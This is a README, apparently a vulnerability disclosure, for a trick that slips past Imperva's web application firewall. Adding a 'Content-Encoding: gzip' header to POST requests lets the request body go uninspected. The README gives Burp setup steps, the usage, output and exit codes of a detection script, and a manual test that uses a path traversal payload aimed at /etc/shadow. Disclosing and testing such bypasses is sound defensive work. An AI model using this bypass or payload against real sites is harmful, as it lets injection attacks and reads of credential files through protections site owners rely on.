# Imperva WAF POST Request Bypass 
Imperva-protected HTTP(S) servers are vulnerable to a trivial bypass that allows malicious POST payloads, such as unobfuscated SQL injection, to evade detection. 

## To Exploit it
Add the header `Content-Encoding: gzip` to your POST requests. Leave your POST data as-is. Don't encode it! That's it - you can put literally anything for the content encoding so long as the first four characters are `gzip`. Imperva just passes it through.

You can do this in Burp by using the proxy's Match & Replace feature:

![](https://i.imgur.com/bNPA1MW.png)

Add a new header like this:

![](https://i.imgur.com/fJtQ8A1.png)

That's it, you're good to go.

# Running the test script
Run `imperva_gzip.py` against a URL that supports POST requests like this:

Syntax:
	`./imperva_gzip.py [-t] URL`

Guess the WAF type for a given URL:
```
$ ./imperva_gzip.py -t https://www.vulnerable.com/search
Imperva Incapsula
$ ./imperva_gzip.py -t https://www.wordpress-user.com/login
WordFence
$ ./imperva_gzip.py -t https://www.cloudflare-customer.com
Cloudflare
```

Check to see if the WAF is vulnerable to the gzip bypass:
```
$ ./imperva_gzip.py https://www.vulnerable.com/search
[+] Can we make POST requests to https://www.vulnerable.com/search?
[+] Checking for Imperva WAF...
[+] Attempting gzip bypass for UNIX trigger...
[+] Vulnerable! HTTP response code: 200
[+] Attempting gzip bypass for Windows trigger...
[+] Vulnerable! HTTP response code: 200
```

## Scripting
The exit codes for `imperva_gzip.py` are as follows:

```
  0: Returned after getting WAF type.
  1: Command-line was invalid.
  2: There was an error connecting. Could be DNS error, timeout, etc.
  3: No WAF was detected; malicious UNIX/Windows payloads weren't blocked.
  4: A WAF was detected, but it wasn't Imperva.
128: There is an Imperva WAF, but it is not vulnerable to the gzip bypass.
129: The bypass was effective for the UNIX payload, but not the Windows one.
130: The bypass was effective for the Windows payload, but not the UNIX one.
131: The bypass was effective against both Windows and UNIX payloads.
```

## Process to Manually Test for Vulnerability
Send three POST requests:

1. Establish a baseline POST request/response with a valid but harmless POST request.
2. Trigger the Imperva WAF using the same POST request, but with extra “malicious” data such as `&test=../../../../../../../etc/shadow` in the body to verify that Imperva blocks it.
3. Add the header `Content-Encoding: gzip` to the same malicious request and verify that Imperva doesn't block it.

## Other Encodings
According to https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Encoding there are four valid values for the `Content-Encoding` header:

* `compress`
* `deflate`
* `gzip`
* `br`

In testing, only `gzip` appears to work as a bypass. I wonder if gzip is whitelisted for performance reasons, maybe by default? I'll do more research and update this page soon.
